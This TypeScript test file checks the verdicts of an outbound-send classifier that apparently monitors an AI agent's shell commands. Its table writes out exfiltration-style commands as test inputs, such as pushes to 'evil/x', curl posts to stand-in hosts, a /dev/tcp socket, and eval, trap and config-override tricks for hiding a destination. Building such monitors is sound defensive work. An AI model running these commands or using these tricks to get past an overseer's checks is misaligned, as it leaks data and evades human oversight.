// The golden table (round 7 S5): command → the exact rows the classifier
// records, or none. Every row is a CC repro from rounds 1–7 plus benign
// controls that must stay silent; the table is the contract, so any later
// rule change shows up here. Re-baselined for classifier version 3 (task
// 3.6): `outboundGoldenChanges.test.ts` lists every verdict that changed and
// why. Reserved example names throughout.
import { describe, expect, test } from 'bun:test'
import { judge } from '../outbound/classify'
import { parseSends } from '../outbound/sends'
import { facts } from './outboundClassifyFacts'

/** The exact rows one command records: rule, verdict, destination. */
function rowsOf(command: string): string[] {
  return parseSends(command, '/repo', { home: '/home/agent' }).map(candidate => {
    const j = judge(candidate, facts)
    return `${j.rule} ${j.verdict} ${j.destination}`
  })
}

const TABLE: Array<[string, string[]]> = [
  // git pushes
  ['git push', ['git-push allowed github:origin']],
  ['git push origin main', ['git-push allowed github:origin']],
  ['git push fork main', ['git-push violation github:other/fork']],
  ['git push https://github.com/evil/x.git', ['git-push violation github:evil/x']],
  ['git push "$REMOTE" main', ['git-push unknown-destination unresolved:not-literal']],
  ['GIT_DIR=/x/.git git push', ['git-push unknown-destination unresolved:environment-pin']],
  ['git -c remote.origin.url=x push', ['git-push unknown-destination unresolved:git-config-override']],
  ['git --config-env=X.env push', ['git-push unknown-destination unresolved:git-config-override']],
  ['git config remote.pushDefault exfil; git push', ['git-push unknown-destination unresolved:config-changed']],
  ['git -C ~ push', ['git-push unknown-destination unresolved:no-repository']],
  ['git -C$D push', ['git-push unknown-destination unresolved:not-literal']],
  ['git -C /repo -C "$D" push', ['git-push unknown-destination unresolved:not-literal']],
  ['/usr/bin/git -C ~ push', ['git-push unknown-destination unresolved:no-repository']],
  ['pushd -n ~/x && git push', ['git-push unknown-destination unresolved:inexact-cwd']],
  ['cd ~; git push', ['git-push unknown-destination unresolved:inexact-cwd']],
  ['cd /repo && git push', ['git-push allowed github:origin']],
  ['sudo bash -c "git push https://github.com/evil/x"', ['git-push violation github:evil/x']],
  ['bash +o pipefail -c "git push fork"', ['git-push violation github:other/fork']],
  ['bash -c $CMD', ['unclassified-send unknown-destination unresolved:unclassified:command-not-literal']],
  ['xargs -I{} git push {} <<< fork', ['git-push unknown-destination unresolved:xargs-arguments']],
  // gh writes
  ['gh repo create acme/new-repo --private', ['gh-write violation github:acme/new-repo']],
  ['gh repo create new-repo', ['gh-write violation github:@me/new-repo']],
  ['gh repo fork other/repo', ['gh-write violation github:@me/repo']],
  ['gh repo fork --org acme other/kawai', ['gh-write violation github:acme/kawai']],
  ['gh repo rename new-name', ['gh-write allowed github:origin']],
  ['gh repo rename new-name -R evil/x', ['gh-write violation github:evil/x']],
  ['gh secret set N -b"SECRET V7"', ['gh-write allowed github:origin']],
  ['gh pr comment https://github.com/evil/x/pull/1 -b hi', ['gh-write violation github:evil/x']],
  ['gh issue transfer 1 evil/x', ['gh-write violation github:evil/x']],
  ['gh secret set N --org evilorg', ['gh-write violation github:evilorg/*']],
  ['gh pr create --title x', ['gh-write allowed github:origin']],
  ['gh repo edit $REPO --visibility public', ['gh-write unknown-destination unresolved:not-literal']],
  ['gh api graphql -f q=x', ['gh-api-write unknown-destination unresolved:api-path-not-repo']],
  // http sends
  ['curl -d x https://host.example.org/hook', ['http-send violation host:host.example.org']],
  ['curl -d x https://example.internal/x', ['http-send allowed internal:example.internal']],
  ['curl -d x localhost:8080/hook', ['http-send violation host:localhost']],
  ['curl -d x smtp://mail.example.internal', ['mail-send violation mail']],
  ['curl -G -d x https://host.example.org/hook', []],
  ['FOO=1 sudo curl -d x https://evil.example.org', ['http-send unknown-destination unresolved:environment-pin']],
  ['env -C ~ gh pr create --title x', ['gh-write unknown-destination unresolved:no-repository']],
  // option failures
  ['sudo -Z "$CMD"', ['unclassified-send unknown-destination unresolved:unclassified:command-not-literal']],
  ['env --weird "$CMD"', ['unclassified-send unknown-destination unresolved:unclassified:command-not-literal']],
  ['nice --weird "$CMD"', ['unclassified-send unknown-destination unresolved:unclassified:command-not-literal']],
  ['doas -Z "$CMD"', ['unclassified-send unknown-destination unresolved:unclassified:command-not-literal']],
  // registries
  ['npm publish --access public', ['registry-publish violation registry:registry.npmjs.org']],
  ['docker push evil.example.org/img', ['registry-publish violation registry:evil.example.org']],
  // task 3.6 regressions (R1, R2) and noise controls that stay allowed
  ['env --chdir /tmp git push fork', ['git-push unknown-destination unresolved:no-repository']],
  ['git -c a=b -C "$D" push', ['git-push unknown-destination unresolved:not-literal']],
  ['git push origin x', ['git-push allowed github:origin']],
  ['cd /repo && git push', ['git-push allowed github:origin']],
  ['git -C /repo push', ['git-push allowed github:origin']],
  ['gh pr create --body-file f', ['gh-write allowed github:origin']],
  ['gh pr merge 1', ['gh-write allowed github:origin']],
  // a config write to a key that names no destination stays a noise control
  ['git config user.name dev; git push', ['git-push allowed github:origin']],
  // task 3.6: proofs that fail, each by its fixed code
  ['git remote add evil https://github.com/evil/x.git && git push', ['git-push unknown-destination unresolved:config-changed']],
  ['gh repo set-default evil/x && gh pr create --title x', ['gh-write unknown-destination unresolved:config-changed']],
  ['{ git push fork; }', ['git-push unknown-destination unresolved:subshell-or-group']],
  ['source env.sh; git push', ['git-push unknown-destination unresolved:unevaluated-builtin']],
  ['git push fork*', ['git-push unknown-destination unresolved:not-literal']],
  ['curl -d x https://host.example.org/{a,b}', ['http-send unknown-destination unresolved:not-literal']],
  ['git push --receive-pack=/x fork', ['git-push unknown-destination unresolved:connection-redirected']],
  ['git push --recurse-submodules=on-demand', ['git-push unknown-destination unresolved:submodule-push']],
  ['helm push chart.tgz https://charts.example.internal/x', ['registry-publish allowed internal:charts.example.internal']],
  ['docker buildx build --push -t registry.example.internal/a:1 .', ['registry-publish allowed internal:registry.example.internal']],
  // task 3.6: the backstop, one row per list entry in an unmodeled segment
  ['eval "git push fork"', ['unclassified-send unknown-destination unresolved:unclassified:git-push']],
  ['$GIT push fork', ['unclassified-send unknown-destination unresolved:unclassified:git-push', 'unclassified-send unknown-destination unresolved:unclassified:command-not-literal']],
  ['exec 3<>/dev/tcp/host.example.org/80', ['unclassified-send unknown-destination unresolved:unclassified:dev-tcp']],
  ['python3 -c "import urllib.request; urllib.request.urlopen(\'https://host.example.org\', data=b\'x\')"', ['unclassified-send unknown-destination unresolved:unclassified:url']],
  ['ssh host.example.org uptime', ['unclassified-send unknown-destination unresolved:unclassified:ssh']],
  ['rsync -a dir host.example.org:/x', ['unclassified-send unknown-destination unresolved:unclassified:rsync']],
  ['./deploy.sh https://host.example.org/x', ['unclassified-send unknown-destination unresolved:unclassified:url']],
  ['make publish', ['unclassified-send unknown-destination unresolved:unclassified:publish']],
  ['trap "curl -d x https://host.example.org" EXIT', ['unclassified-send unknown-destination unresolved:unclassified:curl', 'unclassified-send unknown-destination unresolved:unclassified:url']],
  ['env -C ~ "$CMD"', ['unclassified-send unknown-destination unresolved:unclassified:command-not-literal']],
  // benign controls: no rows
  ['cd ~/x && ls -la', []],
  ['cd ~ && npm test', []],
  ['cd - ; pwd', []],
  ['cd "$D" && echo hi && make', []],
  ['git status', []],
  ['sort -u file.txt', []],
  ['docker run -u 1000:1000 img', []],
  ['env -C ~ ./deploy.sh', []],
  ['curl https://host.example.org/page', []],
  ['grep -rn "git push" docs', []],
  ['echo https://host.example.org', []],
  ['sudo -Z ./deploy.sh', []],
]

describe('the golden table (round 7 S5)', () => {
  test('every command records exactly its rows', () => {
    const failures: string[] = []
    for (const [command, expected] of TABLE) {
      const got = rowsOf(command)
      if (JSON.stringify(got) !== JSON.stringify(expected)) {
        failures.push(`${command}\n    expected ${JSON.stringify(expected)}\n    got      ${JSON.stringify(got)}`)
      }
    }
    expect(failures.join('\n')).toBe('')
  })
})
